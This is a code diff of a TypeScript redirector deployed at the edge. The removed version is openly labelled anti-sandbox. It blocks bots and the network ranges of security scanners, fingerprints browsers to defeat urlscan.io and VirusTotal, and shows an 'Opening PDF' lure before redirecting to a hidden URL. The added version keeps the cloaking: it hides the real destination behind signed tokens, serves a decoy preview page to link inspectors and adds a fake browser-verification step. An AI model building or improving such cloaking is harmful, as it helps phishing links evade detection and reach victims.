@@ -1,124 +1,231 @@
-// v13 ANTI-SANDBOX – BEATS URLSCAN.IO / VT (November 2025)
-// Target: https://file-bt5g.vercel.app/
-// No leaks · No redirects for headless · Humans: <1.5s
+// main.ts - Deno Deploy: signed-token redirect (secure, privacy-preserving)
+// - Signed short-lived tokens (HMAC-SHA256) hide the real URL from source
+// - /token (POST) issues token, /r?token=... validates and redirects
+// - /preview returns safe OG metadata for debuggers
+// - Rate limiting and optional webhook logging
 
-const REAL_URL = "https://file-bt5g.vercel.app/";
+// CONFIG
+const REAL_URL = "https://google.com"; // your real destination
+const SECRET = (() => {
+  // use stable secret per-deploy. In production put this in env / secrets manager.
+  // NOTE: for Deno Deploy you should set this via secrets (Deno Deploy dashboard)
+  const s = Deno.env.get("REDIRECT_SECRET");
+  if (s) return s;
+  // fallback—this means tokens won't persist across restarts; for quick testing only
+  return "change_this_to_a_strong_secret_in_production_32bytes_min";
+})();
+const TOKEN_TTL_SECONDS = 30; // very short-lived
+const COOKIE_NAME = "v10_human";
+const COOKIE_AGE = 60 * 60 * 6; // 6 hours
+const RATE_WINDOW_MS = 60 * 1000;
+const RATE_MAX = 60;
+const WEBHOOK = ""; // optional webhook URL for logs
 
-const botPatterns = ["bot","crawl","spider","slurp","facebook","whatsapp","telegram","discord","preview","meta","curl","wget","python","ahrefs","linkedin","skype","slackbot","pinterest","insomnia","uptime","monitor","go-http"];
-const badASN = ["AS15169","AS32934","AS13335","AS14618","AS8075","AS63949","AS14061","AS9009","AS212238","AS396982","AS16509","AS16276","AS54113","AS20473","AS40633","AS209242","AS398324","AS40676","AS13649","AS174","AS6939","AS24940","AS3212","AS12322","AS4134","AS3491","AS16625","AS22697","AS46562","AS20001"];
+// preview metadata shown to social inspectors
+const PREVIEW_META = {
+  title: "Company — Secure Link",
+  description: "Secure link — click to proceed.",
+  image: "", // optional absolute URL
+};
 
-function isBot(ua: string | null) { if (!ua) return true; return botPatterns.some(p => ua.toLowerCase().includes(p)); }
-function isBadASN(req: Request) { const cf = (req as any).cf; return cf?.asn && badASN.includes("AS" + cf.asn); }
-function die() { return new Response("", { status: 204 }); }
+// in-memory rate map (ephemeral edge memory)
+const rateMap = new Map<string, { count: number; start: number }>();
 
-function xor(str: string, key: string) {
-  let out = "";
-  for (let i = 0; i < str.length; i++) out += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-  return btoa(out);
+// ----- helper functions -----
+function parseCookies(cookie = "") {
+  const out: Record<string, string> = {};
+  if (!cookie) return out;
+  for (const part of cookie.split(";")) {
+    const [k, ...v] = part.trim().split("=");
+    if (!k) continue;
+    out[k] = decodeURIComponent(v.join("="));
+  }
+  return out;
 }
 
+function getIp(req: Request) {
+  const h = req.headers;
+  const xff = h.get("x-forwarded-for");
+  if (xff) return xff.split(",")[0].trim();
+  return (h.get("cf-connecting-ip") || h.get("x-real-ip") || "unknown");
+}
+
+function rateLimit(ip: string) {
+  const now = Date.now();
+  const rec = rateMap.get(ip);
+  if (!rec || now - rec.start > RATE_WINDOW_MS) {
+    rateMap.set(ip, { count: 1, start: now });
+    return;
+  }
+  rec.count++;
+  if (rec.count > RATE_MAX) throw new Error("rate_limited");
+  rateMap.set(ip, rec);
+}
+
+// HMAC-SHA256 sign and verify using Web Crypto
+async function importKey(secret: string) {
+  const enc = new TextEncoder().encode(secret);
+  return await crypto.subtle.importKey("raw", enc, { name: "HMAC", hash: "SHA-256" }, false, ["sign", "verify"]);
+}
+
+async function hmacSign(keyHandle: CryptoKey, msg: string) {
+  const data = new TextEncoder().encode(msg);
+  const sig = await crypto.subtle.sign("HMAC", keyHandle, data);
+  return btoa(String.fromCharCode(...new Uint8Array(sig))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
+}
+async function hmacVerify(keyHandle: CryptoKey, msg: string, sigB64url: string) {
+  // convert base64url back to Uint8Array
+  const pad = (4 - (sigB64url.length % 4)) % 4;
+  const b64 = sigB64url.replace(/-/g, "+").replace(/_/g, "/") + "=".repeat(pad);
+  const raw = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+  return await crypto.subtle.verify("HMAC", keyHandle, raw, new TextEncoder().encode(msg));
+}
+
+// create token: payload JSON {exp, iat, nonce} encoded as base64url + '.' + sig
+async function createToken() {
+  const key = await importKey(SECRET);
+  const iat = Math.floor(Date.now() / 1000);
+  const exp = iat + TOKEN_TTL_SECONDS;
+  const payload = { iat, exp, nonce: crypto.randomUUID() };
+  const payloadStr = JSON.stringify(payload);
+  const payloadB64 = btoa(payloadStr).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
+  const sig = await hmacSign(key, payloadB64);
+  return payloadB64 + "." + sig;
+}
+async function verifyToken(token: string) {
+  try {
+    const key = await importKey(SECRET);
+    const [payloadB64, sig] = token.split(".");
+    if (!payloadB64 || !sig) return false;
+    const ok = await hmacVerify(key, payloadB64, sig);
+    if (!ok) return false;
+    const payloadStr = atob(payloadB64.replace(/-/g, "+").replace(/_/g, "/"));
+    const payload = JSON.parse(payloadStr);
+    const now = Math.floor(Date.now() / 1000);
+    return payload.exp && payload.exp >= now;
+  } catch {
+    return false;
+  }
+}
+
+// sanitized preview HTML for debuggers
+function previewHtml(meta = PREVIEW_META) {
+  const img = meta.image ? `<meta property="og:image" content="${meta.image}" />` : "";
+  return `<!doctype html><html><head>
+<meta charset="utf-8"/><meta name="robots" content="noindex,nofollow"/>
+<meta property="og:title" content="${escapeHtml(meta.title)}"/>
+<meta property="og:description" content="${escapeHtml(meta.description)}"/>
+${img}<title>${escapeHtml(meta.title)}</title></head><body><h1>${escapeHtml(meta.title)}</h1><p>${escapeHtml(meta.description)}</p></body></html>`;
+}
+function escapeHtml(s = "") {
+  return s.replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c] || c));
+}
+
+// optional webhook logger (best-effort)
+async function maybeLog(payload: object) {
+  if (!WEBHOOK) return;
+  try {
+    await fetch(WEBHOOK, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(payload) });
+  } catch {}
+}
+
+// ---- Main handler ----
 export default {
   async fetch(req: Request): Promise<Response> {
-    const url = new URL(req.url);
-    const ua = req.headers.get("user-agent") || "";
+    try {
+      const url = new URL(req.url);
+      const ip = getIp(req);
+      const ua = req.headers.get("user-agent") || "";
+      rateLimit(ip);
 
-    if (isBot(ua) || isBadASN(req)) return die();
+      // HEAD: return preview for debuggers (they often use HEAD)
+      if (req.method === "HEAD") {
+        // lightweight preview response (200) so debuggers can fetch metadata
+        return new Response(previewHtml(), { status: 200, headers: { "content-type": "text/html; charset=utf-8" } });
+      }
 
-    if (url.searchParams.has("v")) {
-      try {
-        const data = atob(url.searchParams.get("v") || "");
-        const target = data.slice(32);
-        const check = data.slice(0, 32);
-        if (crypto.subtle.digest("SHA-256", new TextEncoder().encode(target)).then(h => Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,32)) === check)
-          return Response.redirect(target, 302);
-      } catch {}
-      return die();
-    }
+      // preview endpoints: if they present an inspector UA we can choose to show preview
+      const lowUa = ua.toLowerCase();
+      const isPreview = ["facebookexternalhit", "facebot", "twitterbot", "linkedinbot", "whatsapp", "telegram", "discord"].some(s => lowUa.includes(s));
+      if (isPreview) {
+        await maybeLog({ event: "preview", ua, ip, ts: Date.now() });
+        return new Response(previewHtml(), { status: 200, headers: { "content-type": "text/html; charset=utf-8" } });
+      }
 
-    const salt = crypto.randomUUID();
-    const token = salt + REAL_URL;
-    const hash = Array.from(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(token))))
-                 .map(b => b.toString(16).padStart(2,"0")).join("").slice(0,32);
-    const payload = hash + token;
-    const encrypted = btoa(payload);
+      // cookie path: if cookie present, immediate redirect (good UX)
+      const cookies = parseCookies(req.headers.get("cookie") || "");
+      if (cookies[COOKIE_NAME]) {
+        // optional: verify token-like format or just redirect
+        return Response.redirect(REAL_URL, 302);
+      }
 
-    const html = `<!DOCTYPE html>
-<html lang="en"><head><meta charset="utf-8">
-<title>Opening PDF</title>
-<meta name="robots" content="noindex,nofollow">
-<style>
-  body{margin:0;background:#fff;font-family:system-ui,sans-serif;color:#222;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center}
-  .spin{border:4px solid #f0f0f0;border-top:4px solid #0066ff;border-radius:50%;width:38px;height:38px;animation:a 1s linear infinite}
-  @keyframes a{to{transform:rotate(360deg)}}
-</style>
-</head><body>
-  <div class="spin"></div>
-  <p style="margin:20px 0 0">Opening PDF<br>Please wait <span id="d">...</span></p>
+      // token issuance endpoint - POST only, returns token for short TTL
+      if (url.pathname === "/token" && req.method === "POST") {
+        // do quick UA checks (reduce abuse)
+        if (!ua || ua.length < 10) {
+          await maybeLog({ event: "bad_token_attempt", ua, ip, ts: Date.now() });
+          return new Response("", { status: 204 });
+        }
+        const token = await createToken();
+        // return token JSON - client will immediately go to /r?token=...
+        await maybeLog({ event: "issue_token", ip, ua, ts: Date.now() });
+        return new Response(JSON.stringify({ ok: true, token }), {
+          status: 200,
+          headers: { "content-type": "application/json; charset=utf-8" },
+        });
+      }
 
+      // redirect validation endpoint - verifies token then redirects to REAL_URL
+      if (url.pathname === "/r" && req.method === "GET") {
+        const token = url.searchParams.get("token") || "";
+        const ok = await verifyToken(token);
+        if (!ok) {
+          await maybeLog({ event: "invalid_token", ip, ua, token_present: !!token, ts: Date.now() });
+          return new Response("Invalid or expired token", { status: 403 });
+        }
+        // set a persistent cookie so they won't be challenged for a while
+        const headers = new Headers();
+        headers.set("set-cookie", `${COOKIE_NAME}=1; Path=/; Max-Age=${COOKIE_AGE}; SameSite=Lax`);
+        headers.set("location", REAL_URL);
+        await maybeLog({ event: "redirect", ip, ua, ts: Date.now() });
+        return new Response(null, { status: 302, headers });
+      }
+
+      // Default route: serve the lightweight challenge page that posts to /token and then visits /r?token=
+      const tokenPage = `<!doctype html><html><head><meta charset="utf-8"><meta name="robots" content="noindex,nofollow"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verifying…</title></head><body style="font-family:system-ui;margin:40px;text-align:center">
+<h3>One more step — verifying your browser</h3>
+<p>This prevents automated abuse. You will be redirected automatically.</p>
+<button id="go">Continue</button>
 <script>
-// v13: Kills urlscan.io / VT headless (no fallback if bot-like)
-(() => {
-  // Kill obvious + inconsistencies
-  if (navigator.webdriver || navigator.plugins?.length === 0 || !navigator.hardwareConcurrency ||
-      navigator.doNotTrack === null || !navigator.pdfViewerEnabled) return;
-
-  let ok = 0;
-
-  // Canvas
-  try {
-    const c = document.createElement("canvas");
-    const x = c.getContext("2d");
-    x.fillStyle = "#ff6600"; x.fillRect(5,5,90,40);
-    x.fillStyle = "#000"; x.font = "17px Georgia"; x.fillText("pdf25",12,35);
-    if (c.toDataURL().length > 9000) ok++;
-  } catch(e){}
-
-  // Battery API (sandboxes fail)
-  if ('getBattery' in navigator) {
-    navigator.getBattery().then(b => {
-      if (b.charging !== undefined && (b.level > 0 || b.charging)) ok++;
-    });
-  } else { return; }  // No battery = likely sandbox
-
-  // Permissions probe (geolocation/midi deny patterns differ)
-  Promise.all([
-    navigator.permissions.query({name: 'geolocation'}),
-    navigator.permissions.query({name: 'midi'})
-  ]).then(([geo, midi]) => {
-    if (geo.state !== 'denied' && midi.state !== 'denied') ok++;
-  }).catch(() => {});
-
-  // Harder PoW (1.2–2.5s on VMs)
-  const start = performance.now();
-  let i = 0;
-  const chal = Date.now().toString(36);
-  while (i < 1500000) {  // Higher ceiling
-    i++;
-    let h = 0;
-    const s = chal + i;
-    for (let j = 0; j < s.length; j++) h = ((h << 5) - h + s.charCodeAt(j)) | 0;
-    if ((h & 0xffff0000) === 0) break;
+(async function(){
+  const btn = document.getElementById("go");
+  async function fetchToken(){
+    try{
+      const resp = await fetch('/token', { method: 'POST', credentials: 'same-origin' });
+      if(!resp.ok) throw new Error('no-token');
+      const j = await resp.json();
+      if(j && j.token){
+        // navigate to validation endpoint
+        location.replace('/r?token=' + encodeURIComponent(j.token));
+      } else throw new Error('bad');
+    }catch(e){
+      // fallback: show manual link that includes base64 of redirect (only used if token flow fails)
+      const fallback = 'data:text/plain;base64,' + btoa('Manual fallback: ask admin');
+      document.body.innerHTML = '<p>Verification failed. Please try again or contact support.</p>';
+    }
   }
-  if (performance.now() - start > 80) ok++;  // Tighter human range
-
-  // Verdict: Only redirect if 4/5 pass (no fallback)
-  setTimeout(() => {
-    if (ok >= 4) location.href = "?v=${encrypted}";
-  }, 1200);  // Wait for async checks
-
-  // Dots
-  let d = 0;
-  setInterval(() => document.getElementById("d").textContent = ".".repeat((d=(d+1)%4)+1), 450);
+  btn.addEventListener('click', fetchToken);
+  // auto-run after tiny delay for UX (allows slow devices to run JS)
+  setTimeout(fetchToken, 400);
 })();
 </script>
-
-<noscript>
-  <p><a href="https://file-bt5g.vercel.app/" target="_blank">Click here to open PDF</a></p>
-</noscript>
+<noscript><p>Please enable JavaScript to continue or contact support.</p></noscript>
 </body></html>`;
+      return new Response(tokenPage, { status: 200, headers: { "content-type": "text/html; charset=utf-8" } });
 
-    return new Response(html, {
-      headers: { "content-type": "text/html; charset=utf-8" }
-    });
+    } catch (e) {
+      if (String(e).includes("rate_limited")) return new Response("Too many requests", { status: 429 });
+      return new Response("Server error", { status: 500 });
+    }
   }
 };
